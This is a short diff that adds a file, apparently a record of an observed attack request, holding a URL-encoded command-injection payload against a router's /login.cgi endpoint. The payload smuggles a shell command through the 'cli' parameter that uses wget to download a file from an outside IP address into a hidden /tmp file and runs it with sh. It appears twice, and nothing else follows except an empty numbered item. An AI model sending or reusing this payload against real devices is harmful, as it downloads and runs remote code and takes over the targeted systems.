@@ -1,0 +1,6 @@
+1.GET /login.cgi?cli=aa%20aa%27;wget%20http://209.141.33.86/d%20-O%20-%3E%20/tmp/.shinka;sh%20/tmp/.shinka%27$ HTTP/1.1
+
+/login.cgi?cli=aa%20aa%27;wget%20http://209.141.33.86/d%20-O%20-%3E%20/tmp/.shinka;sh%20/tmp/.shinka%27$
+
+2.
+
